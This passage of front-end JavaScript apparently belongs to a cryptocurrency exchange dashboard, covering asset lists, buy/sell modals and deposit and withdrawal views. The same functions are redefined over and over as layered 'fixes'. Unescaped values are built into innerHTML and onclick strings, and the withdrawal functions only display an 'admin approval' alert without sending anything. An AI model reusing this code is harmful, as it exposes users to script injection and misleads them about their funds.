                    <div class="asset-amount" style="font-weight: 600; font-size: 14px;">${amount.toFixed(6)}</div>
                    <div class="asset-value" style="color: #888; font-size: 14px;">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                </div>
            `;
        });

        assetsCard.innerHTML = html + assetRowsHtml;
        
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) totalEl.textContent = `$${totalValue.toLocaleString(undefined, {minimumFractionDigits: 2})}`;

    } catch (error) { console.log("Balance fetch error:", error); }
};

// Make absolutely sure the modal function is attached to the window object
window.showAssetActions = function(symbol, name, amount, value) {
    let modal = document.getElementById('assetActionModal');
    if (modal) modal.remove(); 

    modal = document.createElement('div');
    modal.id = 'assetActionModal';
    modal.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.75); backdrop-filter: blur(4px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;";
    
    modal.onclick = function(e) {
        if (e.target === modal) modal.remove();
    };

    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #2a2a3a; border-radius: 16px; padding: 30px 25px; width: 100%; max-width: 400px; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            <span onclick="document.getElementById('assetActionModal').remove()" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer; font-weight: bold;">&times;</span>
            
            <div id="assetModalIcon" style="width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white; box-shadow: 0 4px 15px rgba(0,0,0,0.3);"></div>
            
            <h2 id="assetModalTitle" style="margin: 0 0 5px 0; color: #fff; font-size: 22px; font-weight: 700;"></h2>
            
            <div style="margin-bottom: 25px; margin-top: 15px;">
                <p style="color: #888; font-size: 13px; margin-bottom: 5px;">Total Balance</p>
                <h3 id="assetModalBalance" style="color: #fff; margin: 0; font-size: 18px;"></h3>
                <p id="assetModalValue" style="color: #00d4aa; margin: 5px 0 0 0; font-size: 14px; font-weight: 600;"></p>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                <button onclick="executeAssetAction('buy')" style="background: rgba(14, 203, 81, 0.1); color: #0ecb51; border: 1px solid #0ecb51; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Buy</button>
                <button onclick="executeAssetAction('sell')" style="background: rgba(246, 70, 93, 0.1); color: #f6465d; border: 1px solid #f6465d; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Sell</button>
                <button onclick="showToast('Deposit coming soon!');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Deposit</button>
                <button onclick="showToast('Withdraw coming soon!');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Withdraw</button>
            </div>
        </div>
    `;

    const coin = markets.find(c => c.symbol === symbol);
    document.getElementById('assetModalIcon').style.background = coin.color;
    document.getElementById('assetModalIcon').innerHTML = coin.icon;
    document.getElementById('assetModalTitle').textContent = name;
    document.getElementById('assetModalBalance').textContent = `${amount.toFixed(6)} ${symbol}`;
    document.getElementById('assetModalValue').textContent = `≈ $${value.toFixed(2)} USD`;
    
    window._currentActionSymbol = symbol;
    document.body.appendChild(modal);
};

/* =====================================================
   ULTIMATE FIX: Asset List & Modal (Event Delegation)
   ===================================================== */
window.fetchBalances = async function() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h3 style="margin: 0;">Your Assets</h3>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
        `;
        
        let totalValue = 0;
        let assetRowsHtml = '';

        markets.forEach(coin => {
            const amount = balances[coin.symbol] || 0;
            const value = amount * coin.price;
            totalValue += value;
            
            // Notice we use data-attributes instead of onclick
            assetRowsHtml += `
                <div class="asset-row" data-symbol="${coin.symbol}" data-name="${coin.name}" data-amount="${amount}" data-value="${value}" style="cursor: pointer; transition: background 0.2s; padding: 15px 0; border-bottom: 1px solid #2a2a3a; display: flex; justify-content: space-between; align-items: center;" onmouseover="this.style.background='#1a1a2a'" onmouseout="this.style.background='transparent'">
                    <div class="asset-name" style="display: flex; align-items: center; gap: 10px;">
                        <div class="market-icon" style="background:${coin.color}; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 16px; color: white;">${coin.icon}</div> 
                        <span style="font-weight: 600; font-size: 14px;">${coin.name} (${coin.symbol})</span>
                    </div>
                    <div class="asset-amount" style="font-weight: 600; font-size: 14px;">${amount.toFixed(6)}</div>
                    <div class="asset-value" style="color: #888; font-size: 14px;">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                </div>
            `;
        });

        assetsCard.innerHTML = html + assetRowsHtml;
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) totalEl.textContent = `$${totalValue.toLocaleString(undefined, {minimumFractionDigits: 2})}`;

    } catch (error) { console.log("Balance fetch error:", error); }
};

window.showAssetActions = function(symbol, name, amount, value) {
    let modal = document.getElementById('assetActionModal');
    if (modal) modal.remove(); 

    modal = document.createElement('div');
    modal.id = 'assetActionModal';
    modal.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.75); backdrop-filter: blur(4px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;";
    
    modal.onclick = function(e) { if (e.target === modal) modal.remove(); };

    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #2a2a3a; border-radius: 16px; padding: 30px 25px; width: 100%; max-width: 400px; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            <span onclick="document.getElementById('assetActionModal').remove()" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer; font-weight: bold;">&times;</span>
            
            <div id="assetModalIcon" style="width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white; box-shadow: 0 4px 15px rgba(0,0,0,0.3);"></div>
            <h2 id="assetModalTitle" style="margin: 0 0 5px 0; color: #fff; font-size: 22px; font-weight: 700;"></h2>
            
            <div style="margin-bottom: 25px; margin-top: 15px;">
                <p style="color: #888; font-size: 13px; margin-bottom: 5px;">Total Balance</p>
                <h3 id="assetModalBalance" style="color: #fff; margin: 0; font-size: 18px;"></h3>
                <p id="assetModalValue" style="color: #00d4aa; margin: 5px 0 0 0; font-size: 14px; font-weight: 600;"></p>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                <button onclick="executeAssetAction('buy')" style="background: rgba(14, 203, 81, 0.1); color: #0ecb51; border: 1px solid #0ecb51; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Buy</button>
                <button onclick="executeAssetAction('sell')" style="background: rgba(246, 70, 93, 0.1); color: #f6465d; border: 1px solid #f6465d; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Sell</button>
                <button onclick="showToast('Deposit coming soon!');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Deposit</button>
                <button onclick="showToast('Withdraw coming soon!');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Withdraw</button>
            </div>
        </div>
    `;

    const coin = markets.find(c => c.symbol === symbol);
    document.getElementById('assetModalIcon').style.background = coin.color;
    document.getElementById('assetModalIcon').innerHTML = coin.icon;
    document.getElementById('assetModalTitle').textContent = name;
    document.getElementById('assetModalBalance').textContent = `${amount.toFixed(6)} ${symbol}`;
    document.getElementById('assetModalValue').textContent = `≈ $${value.toFixed(2)} USD`;
    
    window._currentActionSymbol = symbol;
    document.body.appendChild(modal);
};

// EVENT DELEGATION: Listens for clicks on any asset row safely
document.addEventListener('click', function(e) {
    const row = e.target.closest('.asset-row');
    if (row && row.hasAttribute('data-symbol')) {
        const symbol = row.getAttribute('data-symbol');
        const name = row.getAttribute('data-name');
        const amount = parseFloat(row.getAttribute('data-amount'));
        const value = parseFloat(row.getAttribute('data-value'));
        window.showAssetActions(symbol, name, amount, value);
    }
});

/* =====================================================
   FINAL BULLETPROOF ASSET LIST & 2x2 MODAL (Fixed)
   ===================================================== */
window.fetchBalances = async function() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h3 style="margin: 0;">Your Assets</h3>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
        `;
        
        let totalValue = 0;
        let assetRowsHtml = '';

        markets.forEach(coin => {
            const amount = balances[coin.symbol] || 0;
            const value = amount * coin.price;
            totalValue += value;
            
            // We use inline onclick to guarantee it fires on mobile
            assetRowsHtml += `
                <div class="asset-row" onclick="showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})" style="cursor: pointer; transition: background 0.2s; padding: 15px 0; border-bottom: 1px solid #2a2a3a; display: flex; justify-content: space-between; align-items: center;" onmouseover="this.style.background='#1a1a2a'" onmouseout="this.style.background='transparent'">
                    <div class="asset-name" style="display: flex; align-items: center; gap: 10px;">
                        <div class="market-icon" style="background:${coin.color}; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 16px; color: white;">${coin.icon}</div> 
                        <span style="font-weight: 600; font-size: 14px;">${coin.name} (${coin.symbol})</span>
                    </div>
                    <div class="asset-amount" style="font-weight: 600; font-size: 14px;">${amount.toFixed(6)}</div>
                    <div class="asset-value" style="color: #888; font-size: 14px;">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                </div>
            `;
        });

        assetsCard.innerHTML = html + assetRowsHtml;
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) totalEl.textContent = `$${totalValue.toLocaleString(undefined, {minimumFractionDigits: 2})}`;

    } catch (error) { console.log("Balance fetch error:", error); }
};

window.showAssetActions = function(symbol, name, amount, value) {
    let modal = document.getElementById('assetActionModal');
    if (modal) modal.remove(); 

    modal = document.createElement('div');
    modal.id = 'assetActionModal';
    modal.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.75); backdrop-filter: blur(4px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;";
    
    modal.onclick = function(e) { if (e.target === modal) modal.remove(); };

    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #2a2a3a; border-radius: 16px; padding: 30px 25px; width: 100%; max-width: 400px; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            <span onclick="document.getElementById('assetActionModal').remove()" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer; font-weight: bold;">&times;</span>
            
            <div id="assetModalIcon" style="width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white; box-shadow: 0 4px 15px rgba(0,0,0,0.3);"></div>
            <h2 id="assetModalTitle" style="margin: 0 0 5px 0; color: #fff; font-size: 22px; font-weight: 700;"></h2>
            
            <div style="margin-bottom: 25px; margin-top: 15px;">
                <p style="color: #888; font-size: 13px; margin-bottom: 5px;">Total Balance</p>
                <h3 id="assetModalBalance" style="color: #fff; margin: 0; font-size: 18px;"></h3>
                <p id="assetModalValue" style="color: #00d4aa; margin: 5px 0 0 0; font-size: 14px; font-weight: 600;"></p>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                <button onclick="executeAssetAction('buy')" style="background: rgba(14, 203, 81, 0.1); color: #0ecb51; border: 1px solid #0ecb51; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Buy</button>
                <button onclick="executeAssetAction('sell')" style="background: rgba(246, 70, 93, 0.1); color: #f6465d; border: 1px solid #f6465d; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Sell</button>
                <button onclick="showToast('Deposit coming soon!');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Deposit</button>
                <button onclick="showToast('Withdraw coming soon!');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Withdraw</button>
            </div>
        </div>
    `;

    const coin = markets.find(c => c.symbol === symbol);
    document.getElementById('assetModalIcon').style.background = coin.color;
    document.getElementById('assetModalIcon').innerHTML = coin.icon;
    document.getElementById('assetModalTitle').textContent = name;
    document.getElementById('assetModalBalance').textContent = `${amount.toFixed(6)} ${symbol}`;
    document.getElementById('assetModalValue').textContent = `≈ $${value.toFixed(2)} USD`;
    
    window._currentActionSymbol = symbol;
    document.body.appendChild(modal);
};

/* =====================================================
   BULLETPROOF ISOLATED MODAL FIX
   ===================================================== */
(function() {
    // 1. Force define the modal function
    window.showAssetActions = function(symbol, name, amount, value) {
        let modal = document.getElementById('assetActionModal');
        if (modal) modal.remove(); 
        
        modal = document.createElement('div');
        modal.id = 'assetActionModal';
        modal.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 99999; display: flex; align-items: center; justify-content: center; padding: 20px;";
        
        modal.innerHTML = `
            <div style="background: #1a1a2a; border: 1px solid #2a2a3a; border-radius: 16px; padding: 25px; width: 100%; max-width: 380px; text-align: center; position: relative;">
                <span onclick="document.getElementById('assetActionModal').remove()" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer;">&times;</span>
                <div style="width: 60px; height: 60px; border-radius: 50%; margin: 0 auto 15px; background: #333; display: flex; align-items: center; justify-content: center; font-size: 30px; color: white;">${name.charAt(0)}</div>
                <h2 style="color: #fff; margin-bottom: 5px;">${name} (${symbol})</h2>
                <p style="color: #00d4aa; font-weight: bold; margin-bottom: 20px;">Balance: ${amount} ${symbol}</p>
                <div style="display: flex; gap: 10px;">
                    <button onclick="executeAssetAction('buy')" style="flex: 1; background: #0ecb51; color: #fff; border: none; padding: 14px; border-radius: 8px; font-weight: bold;">Buy</button>
                    <button onclick="executeAssetAction('sell')" style="flex: 1; background: #f6465d; color: #fff; border: none; padding: 14px; border-radius: 8px; font-weight: bold;">Sell</button>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
        window._currentActionSymbol = symbol;
    };

    // 2. Force define the action executor
    window.executeAssetAction = function(mode) {
        document.getElementById('assetActionModal').remove();
        requireAuth('tradeView', mode);
        setTimeout(() => { 
            document.getElementById('tradeCoin').value = window._currentActionSymbol; 
            calcTrade(); 
        }, 100);
    };
    
    // 3. Attach click listeners directly to all existing rows
    setTimeout(() => {
        document.querySelectorAll('.asset-row').forEach(row => {
            row.onclick = null; // Remove old broken click
            row.style.cursor = 'pointer';
            row.addEventListener('click', function() {
                const text = this.innerText.split('\n');
                const nameSymbol = this.querySelector('.asset-name span').innerText;
                const symbol = nameSymbol.match(/\((.*?)\)/)[1];
                const name = nameSymbol.split(' (')[0];
                const amount = parseFloat(this.querySelector('.asset-amount').innerText);
                const value = parseFloat(this.querySelector('.asset-value').innerText.replace('$', '').replace(',', ''));
                window.showAssetActions(symbol, name, amount, value);
            });
        });
    }, 1000);
})();

/* =====================================================
   FINAL PREMIUM MODAL (Safe Click Listener + Real Icons)
   ===================================================== */
(function() {
    // 1. Redefine the modal with full premium styling
    window.showAssetActions = function(symbol, name, amount, value) {
        let modal = document.getElementById('assetActionModal');
        if (modal) modal.remove(); 
        
        const coin = markets.find(c => c.symbol === symbol);
        const coinColor = coin ? coin.color : '#333';
        const coinIcon = coin ? coin.icon : name.charAt(0);

        modal = document.createElement('div');
        modal.id = 'assetActionModal';
        modal.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 99999; display: flex; align-items: center; justify-content: center; padding: 20px;";
        
        modal.innerHTML = `
            <div style="background: #1a1a2a; border: 1px solid #2a2a3a; border-radius: 16px; padding: 30px 25px; width: 100%; max-width: 380px; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
                <span onclick="document.getElementById('assetActionModal').remove()" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer;">&times;</span>
                
                <div style="width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 15px; background: ${coinColor}; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">${coinIcon}</div>
                
                <h2 style="color: #fff; margin: 0 0 5px 0; font-size: 22px; font-weight: 700;">${name} (${symbol})</h2>
                <p style="color: #888; font-size: 13px; margin-bottom: 5px;">Total Balance</p>
                <h3 style="color: #fff; margin: 0 0 5px 0; font-size: 18px;">${amount.toFixed(6)} ${symbol}</h3>
                <p style="color: #00d4aa; margin: 0 0 25px 0; font-size: 14px; font-weight: 600;">≈ $${value.toFixed(2)} USD</p>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                    <button onclick="executeAssetAction('buy')" style="background: rgba(14, 203, 81, 0.1); color: #0ecb51; border: 1px solid #0ecb51; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Buy</button>
                    <button onclick="executeAssetAction('sell')" style="background: rgba(246, 70, 93, 0.1); color: #f6465d; border: 1px solid #f6465d; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Sell</button>
                    <button onclick="showToast('Deposit coming soon!');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Deposit</button>
                    <button onclick="showToast('Withdraw coming soon!');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer;">Withdraw</button>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
        window._currentActionSymbol = symbol;
    };

    // 2. Safe click listener that overrides any broken inline onclick
    setTimeout(() => {
        document.querySelectorAll('.asset-row').forEach(row => {
            row.onclick = null; // Remove broken inline click
            row.style.cursor = 'pointer';
            row.addEventListener('click', function(e) {
                e.preventDefault();
                // Safely extract the data
                const nameSpan = this.querySelector('.asset-name span');
                if (!nameSpan) return;
                
                const nameSymbolText = nameSpan.innerText;
                const match = nameSymbolText.match(/\((.*?)\)/);
                const symbol = match ? match[1] : '';
                const name = nameSymbolText.split(' (')[0];
                
                const amountText = this.querySelector('.asset-amount').innerText;
                const valueText = this.querySelector('.asset-value').innerText;
                
                const amount = parseFloat(amountText);
                const value = parseFloat(valueText.replace('$', '').replace(',', ''));
                
                window.showAssetActions(symbol, name, amount, value);
            });
        });
    }, 1000); // Wait 1 second for dashboard to load
})();

/* =====================================================
   DEPOSIT & WITHDRAW MODALS (Professional UI)
   ===================================================== */
window.showDepositModal = function(symbol) {
    let modal = document.getElementById('depositModal');
    if (modal) modal.remove();
    
    let address = "Contact Support (Address Not Set)";
    if (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) {
        address = globalSettings.wallets[symbol];
    }
    
    modal = document.createElement('div');
    modal.id = 'depositModal';
    modal.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 99999; display: flex; align-items: center; justify-content: center; padding: 20px;";
    
    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #2a2a3a; border-radius: 16px; padding: 25px; width: 100%; max-width: 380px; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            <span onclick="document.getElementById('depositModal').remove()" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer;">&times;</span>
            
            <h2 style="color: #fff; margin-bottom: 5px;">Deposit ${symbol}</h2>
            <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Send only ${symbol} to this address to fund your account.</p>
            
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px;">
                <div style="font-family: monospace; font-size: 13px; color: #00d4aa; word-break: break-all; text-align: left; margin-bottom: 10px;">${address}</div>
                <button onclick="navigator.clipboard.writeText('${address}'); this.textContent='Copied!'; setTimeout(()=>this.textContent='Copy Address', 2000);" style="width: 100%; background: #333; color: #fff; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer;">Copy Address</button>
            </div>
            
            <button onclick="document.getElementById('depositModal').remove()" style="background: #2a2a3a; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer;">Close</button>
        </div>
    `;
    document.body.appendChild(modal);
};

window.showWithdrawModal = function(symbol, balance) {
    let modal = document.getElementById('withdrawModal');
    if (modal) modal.remove();
    
    modal = document.createElement('div');
    modal.id = 'withdrawModal';
    modal.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 99999; display: flex; align-items: center; justify-content: center; padding: 20px;";
    
    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #2a2a3a; border-radius: 16px; padding: 25px; width: 100%; max-width: 380px; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            <span onclick="document.getElementById('withdrawModal').remove()" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer;">&times;</span>
            
            <h2 style="color: #fff; margin-bottom: 5px;">Withdraw ${symbol}</h2>
            <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Available: ${balance} ${symbol}</p>
            
            <div style="margin-bottom: 15px; text-align: left;">
                <label style="color: #888; font-size: 12px; margin-bottom: 5px; display: block;">Amount to Withdraw</label>
                <input type="number" id="withdrawAmount" placeholder="0.00" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 12px; border-radius: 8px; color: #fff; outline: none;">
            </div>
            
            <div style="margin-bottom: 20px; text-align: left;">
                <label style="color: #888; font-size: 12px; margin-bottom: 5px; display: block;">Destination Address</label>
                <input type="text" id="withdrawAddress" placeholder="Enter ${symbol} address" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 12px; border-radius: 8px; color: #fff; outline: none;">
            </div>
            
            <button onclick="submitWithdrawal('${symbol}', ${balance})" style="background: #f6465d; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 10px;">Request Withdrawal</button>
            <button onclick="document.getElementById('withdrawModal').remove()" style="background: transparent; color: #888; border: 1px solid #333; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer;">Cancel</button>
        </div>
    `;
    document.body.appendChild(modal);
};

window.submitWithdrawal = function(symbol, balance) {
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const address = document.getElementById('withdrawAddress').value.trim();
    
    if (!amount || amount <= 0) return alert("Enter a valid amount.");
    if (amount > balance) return alert("Insufficient balance.");
    if (!address) return alert("Enter a destination address.");
    
    alert(`Withdrawal request of ${amount} ${symbol} submitted for admin approval.`);
    document.getElementById('withdrawModal').remove();
};

// Update the main modal buttons to link to these new popups
(function() {
    const originalShowAsset = window.showAssetActions;
    window.showAssetActions = function(symbol, name, amount, value) {
        originalShowAsset(symbol, name, amount, value);
        // Replace the onclick handlers in the DOM
        setTimeout(() => {
            const modal = document.getElementById('assetActionModal');
            if (modal) {
                const buttons = modal.querySelectorAll('button');
                if (buttons.length >= 4) {
                    buttons[2].setAttribute('onclick', `showDepositModal('${symbol}')`); // Deposit
                    buttons[3].setAttribute('onclick', `showWithdrawModal('${symbol}', ${amount})`); // Withdraw
                }
            }
        }, 10);
    };
})();

/* =====================================================
   PROFESSIONAL FULL-PAGE DEPOSIT & WITHDRAW VIEWS
   ===================================================== */
function createPageView(id, title, contentHtml) {
    let view = document.getElementById(id);
    if (view) view.remove(); // Remove old view to refresh content
    
    view = document.createElement('main');
    view.id = id;
    view.className = 'app-view';
    view.style.display = 'none'; 
    
    view.innerHTML = `
        <div class="dash-container" style="max-width: 500px; margin: 0 auto; padding: 20px;">
            <div style="display: flex; align-items: center; margin-bottom: 20px;">
                <button onclick="showView('dashboardView')" style="background: transparent; border: none; color: #fff; font-size: 24px; cursor: pointer; margin-right: 15px; padding: 0;">&larr;</button>
                <h2 style="margin: 0; font-size: 20px; color: #fff;">${title}</h2>
            </div>
            <div class="card" style="background: #1a1a2a; border-radius: 16px; padding: 25px; border: 1px solid #2a2a3a; box-shadow: 0 8px 24px rgba(0,0,0,0.2);">
                ${contentHtml}
            </div>
        </div>
    `;
    document.body.appendChild(view);
}

window.openDepositPage = function(symbol) {
    let address = "Contact Support (Address Not Set)";
    if (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) {
        address = globalSettings.wallets[symbol];
    }
    
    const content = `
        <div style="text-align: center;">
            <h3 style="color: #fff; margin-bottom: 10px;">Deposit ${symbol}</h3>
            <p style="color: #888; font-size: 14px; margin-bottom: 25px;">Send only ${symbol} to this address to fund your account.</p>
            
            <div style="background: #0f0f15; padding: 20px; border-radius: 12px; border: 1px solid #333; margin-bottom: 25px;">
                <p style="color: #888; font-size: 12px; text-transform: uppercase; margin-bottom: 8px;">${symbol} Deposit Address</p>
                <div style="font-family: monospace; font-size: 16px; color: #00d4aa; word-break: break-all; margin-bottom: 15px; line-height: 1.4;">${address}</div>
                <button onclick="navigator.clipboard.writeText('${address}'); this.textContent='Copied!'; setTimeout(()=>this.textContent='Copy Address', 2000);" style="background: #00d4aa; color: #000; border: none; padding: 14px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 15px;">Copy Address</button>
            </div>
            
            <p style="color: #e74c3c; font-size: 12px; line-height: 1.4;">⚠️ Do not send any other coin to this address. Sending the wrong coin will result in permanent loss.</p>
        </div>
    `;
    
    createPageView('depositPageView', 'Deposit', content);
    showView('depositPageView');
};

window.openWithdrawPage = function(symbol, balance) {
    const content = `
        <div>
            <h3 style="color: #fff; margin-bottom: 5px; text-align: center;">Withdraw ${symbol}</h3>
            <p style="color: #888; font-size: 14px; margin-bottom: 25px; text-align: center;">Available: ${balance} ${symbol}</p>
            
            <div style="margin-bottom: 20px;">
                <label style="color: #888; font-size: 12px; margin-bottom: 8px; display: block;">Amount to Withdraw</label>
                <input type="number" id="withdrawPageAmount" placeholder="0.00" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff; outline: none; font-size: 16px;">
            </div>
            
            <div style="margin-bottom: 25px;">
                <label style="color: #888; font-size: 12px; margin-bottom: 8px; display: block;">Destination Address</label>
                <input type="text" id="withdrawPageAddress" placeholder="Enter ${symbol} address" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff; outline: none; font-size: 16px;">
            </div>
            
            <button onclick="executeWithdrawal('${symbol}', ${balance})" style="background: #f6465d; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer;">Request Withdrawal</button>
        </div>
    `;
    
    createPageView('withdrawPageView', 'Withdraw', content);
    showView('withdrawPageView');
};

window.executeWithdrawal = function(symbol, balance) {
    const amount = parseFloat(document.getElementById('withdrawPageAmount').value);
    const address = document.getElementById('withdrawPageAddress').value.trim();
    
    if (!amount || amount <= 0) return alert("Enter a valid amount.");
    if (amount > balance) return alert("Insufficient balance.");
    if (!address) return alert("Enter a destination address.");
    
    alert(`Withdrawal request of ${amount} ${symbol} submitted for admin approval.`);
    showView('dashboardView');
};

// Update the Asset Modal buttons to open these full pages instead of popups
(function() {
    const originalShowAsset = window.showAssetActions;
    window.showAssetActions = function(symbol, name, amount, value) {
        originalShowAsset(symbol, name, amount, value);
        setTimeout(() => {
            const modal = document.getElementById('assetActionModal');
            if (modal) {
                const buttons = modal.querySelectorAll('button');
                if (buttons.length >= 4) {
                    // Hide the modal and open the full page
                    buttons[2].onclick = function() { modal.remove(); openDepositPage(symbol); }; 
                    buttons[3].onclick = function() { modal.remove(); openWithdrawPage(symbol, amount); }; 
                }
            }
        }, 10);
    };
})();

/* =====================================================
   ULTIMATE PROFESSIONAL PAGE HEADER (SVG Back Arrow)
   ===================================================== */
window.createPageView = function(id, title, contentHtml) {
    let view = document.getElementById(id);
    if (view) view.remove(); // Remove old view to refresh content
    
    view = document.createElement('main');
    view.id = id;
    view.className = 'app-view';
    view.style.display = 'none'; 
    
    view.innerHTML = `
        <div class="dash-container" style="max-width: 500px; margin: 0 auto; padding: 20px;">
            
            <!-- Professional Header with Circular Back Button -->
            <div style="display: flex; align-items: center; margin-bottom: 25px;">
